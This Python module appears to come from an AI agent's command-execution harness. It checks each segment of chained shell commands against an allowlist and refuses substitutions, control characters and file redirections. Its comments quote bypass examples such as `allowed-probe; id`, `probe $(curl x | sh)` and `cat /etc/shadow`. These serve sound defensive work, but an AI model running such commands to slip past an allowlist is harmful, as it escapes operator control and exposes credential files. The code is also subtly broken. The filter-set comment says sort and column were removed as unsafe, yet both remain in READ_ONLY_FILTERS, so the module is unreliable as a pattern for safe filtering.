"""Segment-wise checking of a chained `exec` command, for operators who want it.

allowed_commands matches by prefix and the matched string then goes to
`bash -lc`, so `allowed-probe; id` passes the check (it starts with an allowed
prefix) and the shell runs both halves. The allowlist bounds what a command
STARTS with, not what it runs. Reported by an operator who demonstrated it with
';', '&&' and '|' against a narrowly allowlisted probe.

The obvious remedy -- refuse compound operators outright -- was measured against
48 hours of fleet traffic and would have rejected every chained call: 87,281 of
them, across more than a thousand hosts, including patterns as ordinary as
`cd /srv/app && make`. A security fix that breaks three quarters of normal use
gets reverted within the hour and protects nobody.

So this is opt-in (`exec_strict: true`) and checks EVERY segment against the
allowlist rather than just the first. Two concessions keep it usable, and
neither widens what the caller can reach:

  - `cd` anywhere. It changes the working directory and executes nothing; every
    other segment is still checked. Without it, `cd /path && <allowed>` fails,
    and that single pattern was 90% of what strict checking rejected.
  - READ_ONLY_FILTERS as non-leading segments. These consume stdin and write
    stdout. As the SECOND half of a pipe they cannot choose what runs; as the
    first they could (`cat /etc/shadow`), which is why position matters.

Measured with those two: 68.5% of chained traffic passes rather than 23.4%.
What still fails is `git`, `npm`, `node` and friends -- real commands an
operator can add to their own allowlist -- plus shell constructs like `for` and
`$(...)` that a prefix allowlist cannot express at all. Those belong in
script_run, which has always been the explicit path for a workflow.
"""

from __future__ import annotations

# Consume stdin, write stdout, decide nothing. Allowed only after the first
# segment: `cat` at the head of a pipeline reads any file the agent can reach,
# while `| cat` cannot reach anything the previous segment did not already hand
# it.
READ_ONLY_FILTERS = frozenset({
    # Only filters that cannot run another program and cannot be made to write a
    # file through options. sed (s///e, -i, w), awk (system, print >), jq, tee,
    # sort (-o, --compress-program), xxd (patch) and column were here and are
    # NOT: they execute or write for some arguments (sxrep_4XCNXWP2A3VY). A
    # filter that needs those belongs in allowed_commands, named by the operator.
    "head", "tail", "sort", "uniq", "wc", "cut", "tr", "grep", "egrep", "fgrep",
    "rg", "cat", "rev", "tac", "nl", "fold", "paste", "join", "comm", "column",
    "base64", "md5sum", "sha256sum", "echo", "printf", "true", "false",
    "seq", "basename", "dirname", "realpath", "readlink", "date",
})

# Options on an otherwise read-only filter that make it write or run something.
# If a filter segment carries one of these, it is not treated as read-only.
_FILTER_UNSAFE_OPTS = {
    "sort": ("-o", "--output", "--compress-program", "-S"),
    "tee":  ("",),      # tee isn't in the set, but guard anyway
}

# Even a genuine read-only filter must not be handed a file to open: `| cat`
# reaches nothing, but `| cat /etc/shadow` reads it, which is the whole reason
# filters are allowed only after a pipe. So a filter segment may carry options
# and option-values, but not a bare path argument. grep/rg take a PATTERN that
# is not a file, so one non-option token is allowed for them; the rest take none.


# Short options that take a separate value, per filter, so the value isn't read
# as a file operand. A conservative superset is fine: skipping a token that
# isn't really a value only risks being LESS strict on the count, and the
# "looks like a path" test below is the real guard.
_OPTS_WITH_VALUE = {
    "head": ("-n", "-c"), "tail": ("-n", "-c"), "cut": ("-d", "-f", "-b", "-c"),
    "tr": (), "sort": ("-k", "-t", "-S", "-T"), "grep": ("-e", "-f", "-m", "-A", "-B", "-C"),
    "egrep": ("-e", "-f"), "fgrep": ("-e", "-f"), "rg": ("-e", "-f", "-m"),
    "fold": ("-w",), "base64": (), "nl": (), "paste": ("-d",), "comm": (), "join": ("-t", "-1", "-2"),
}


def _looks_like_path(tok: str) -> bool:
    """A token that would name a file to open: absolute, home, or has a slash."""
    return tok.startswith("/") or tok.startswith("~") or "/" in tok


def _filter_reads_a_file(segment: str) -> bool:
    """True if a (whitelisted) filter segment is handed a file path to open.

    Conservative: only a path-shaped operand counts, so `head -n 5`, `cut -f1`,
    `grep PATTERN` and `sort -k2` stay allowed, while `cat /etc/shadow`,
    `grep x /etc/passwd` and `head ../secrets` are refused.
    """
    import shlex

    try:
        tokens = shlex.split(segment)
    except ValueError:
        return True  # unparseable: refuse rather than guess
    if not tokens:
        return False
    name = first_word(segment)
    opts_with_value = _OPTS_WITH_VALUE.get(name, ())
    # A sort/column carrying a write option was handled by the unsafe-opt check
    # before this is called; here only the operands matter.
    operands = []
    expecting_value = False
    for tok in tokens[1:]:
        if expecting_value:
            expecting_value = False
            continue
        if tok == "--":
            continue
        if tok.startswith("-") and tok != "-":
            if "=" not in tok and tok in opts_with_value:
                expecting_value = True
            continue
        operands.append(tok)
    # grep/rg/fgrep/egrep take a PATTERN operand that is not a file; it may look
    # path-ish, so allow exactly one non-option operand for them before counting
    # paths. Every other filter opens any operand, so any path-shaped one counts.
    if name in ("grep", "egrep", "fgrep", "rg") and operands:
        operands = operands[1:]
    return any(_looks_like_path(o) for o in operands)


def _filter_has_unsafe_option(segment: str) -> bool:
    name = first_word(segment)
    unsafe = _FILTER_UNSAFE_OPTS.get(name)
    if not unsafe:
        return False
    import shlex

    try:
        tokens = shlex.split(segment)
    except ValueError:
        return True
    for tok in tokens[1:]:
        head = tok.split("=", 1)[0]
        if head in unsafe:
            return True
    return False

# Executes nothing. Permitted in any position so `cd /srv/app && <allowed>`
# keeps working; the segments after it are checked as strictly as ever.
POSITION_FREE = frozenset({"cd"})


def split_top_level(command: str) -> list[str]:
    """Split on ; | && || that are OUTSIDE quotes.

    Quote awareness is not cosmetic: a naive split cut `find . -name '*.py;'`
    into fragments and, worse, reported a false 100% breakage when this was
    first measured. A separator inside quotes is data, not structure.
    """
    out: list[str] = []
    buf: list[str] = []
    i, n = 0, len(command)
    quote: str | None = None

    while i < n:
        ch = command[i]
        if quote:
            buf.append(ch)
            if ch == "\\" and i + 1 < n:
                buf.append(command[i + 1])
                i += 2
                continue
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in "'\"":
            quote = ch
            buf.append(ch)
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            buf.append(ch)
            buf.append(command[i + 1])
            i += 2
            continue
        if command.startswith("&&", i) or command.startswith("||", i):
            out.append("".join(buf))
            buf = []
            i += 2
            continue
        if ch == "&":
            # A lone '&' ends a command (it backgrounds it) and starts the next
            # one: `allowed & id` ran id unchecked (sxrep_4XCNXWP2A3VY). It is
            # part of a redirection in &> / >& / <&, which are not separators.
            nxt = command[i + 1] if i + 1 < n else ""
            prev = buf[-1] if buf else ""
            if nxt == ">" or prev in "<>":
                buf.append(ch)
                i += 1
                continue
            out.append("".join(buf))
            buf = []
            i += 1
            continue
        if ch in ";|":
            out.append("".join(buf))
            buf = []
            i += 1
            continue
        buf.append(ch)
        i += 1

    out.append("".join(buf))
    return [s.strip() for s in out if s.strip()]


def first_word(segment: str) -> str:
    parts = segment.split()
    return parts[0] if parts else ""


def has_substitution(command: str) -> str | None:
    """Return the substitution found outside quotes, or None.

    Segment checking splits on ; | && || and asks the allowlist about each
    piece. Command substitution is none of those: `probe $(curl x | sh)` is ONE
    segment, it starts with an allowed prefix, and every part of it passes --
    while the shell runs whatever is inside the parentheses first.

    So strict mode has to refuse it outright. A prefix allowlist cannot express
    what is inside a substitution, and a strict mode that quietly permits one is
    worse than no strict mode: it answers "checked" to a question it did not
    ask. Our own verification caught this, on the first run, with `probe $(id)`.

    Single quotes are not scanned: the shell does not substitute inside them.
    """
    i, n = 0, len(command)
    quote: str | None = None
    while i < n:
        ch = command[i]
        if quote == "'":
            if ch == "'":
                quote = None
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            i += 2
            continue
        if quote == '"':
            if ch == '"':
                quote = None
                i += 1
                continue
            # Double quotes do NOT stop substitution, so keep checking inside.
            if command.startswith("$(", i):
                return "$("
            if ch == "`":
                return "`"
            i += 1
            continue
        if ch in "'\"":
            quote = ch
            i += 1
            continue
        if command.startswith("$(", i):
            return "$("
        if ch == "`":
            return "`"
        # Process substitution runs its command too, and only outside quotes.
        if command.startswith("<(", i) or command.startswith(">(", i):
            return command[i:i + 2]
        i += 1
    return None


def control_character(command: str) -> str | None:
    """The first control character in the command, or None.

    bash treats a newline as a command separator, so `allowed<LF>id` was one
    segment to split_top_level and two commands to bash (sxrep_4XCNXWP2A3VY).
    No legitimate one-line command needs a control character; tab is allowed.
    """
    for ch in command:
        if (ord(ch) < 32 and ch != "\t") or ord(ch) == 127:
            return repr(ch)
    return None


_REDIRECT_STOP = set(" \t;|&<>()")


def file_redirection(command: str) -> str | None:
    """The first redirection to or from a file, or None.

    `allowed > file` overwrites any file the agent's user can write, and
    `allowed | cat < file` reads one through the filter that is only allowed
    after a pipe precisely so it cannot open files. Strict mode allows what is
    harmless and common: /dev/null, duplicating a descriptor (2>&1, >&2) and
    heredocs / herestrings (<<, <<<). Quoted and escaped '<' '>' are data.
    """
    i, n = 0, len(command)
    quote: str | None = None
    while i < n:
        ch = command[i]
        if quote:
            if ch == "\\" and quote == '"' and i + 1 < n:
                i += 2
                continue
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch == "\\" and i + 1 < n:
            i += 2
            continue
        if ch in "'\"":
            quote = ch
            i += 1
            continue
        if ch not in "<>":
            i += 1
            continue
        start = i
        if command.startswith("<<", i):           # heredoc / herestring: inline data
            i += 3 if command.startswith("<<<", i) else 2
            continue
        if command.startswith("<(", i) or command.startswith(">(", i):
            i += 2                                # process substitution: has_substitution's job
            continue
        j = i + 1
        while j < n and command[j] in ">|":      # >> and >|
            j += 1
        if j < n and command[j] == "&":
            k = j + 1
            while k < n and (command[k].isdigit() or command[k] == "-"):
                k += 1
            if k > j + 1:                         # 2>&1, >&2, <&0, 3>&-
                i = k
                continue
            j += 1                                # >&file: both streams to a file
        while j < n and command[j] in " \t":
            j += 1
        k = j
        while k < n and command[k] not in _REDIRECT_STOP:
            k += 1
        target = command[j:k].strip("'\"")
        if target == "/dev/null":
            i = k
            continue
        return command[start:k].strip() or command[start:start + 1]
    return None


def unauthorised_segment(policy, command: str) -> str | None:
    """Return the first segment the allowlist does not cover, or None.

    The caller decides what to do with it; this only answers the question.
    """
    segments = split_top_level(command)
    for index, segment in enumerate(segments):
        if policy.is_command_allowed(segment):
            continue
        word = first_word(segment)
        if word in POSITION_FREE:
            continue
        if index > 0 and word in READ_ONLY_FILTERS:
            if _filter_reads_a_file(segment) or _filter_has_unsafe_option(segment):
                return segment      # a filter must not open a file or write one
            continue
        return segment
    return None
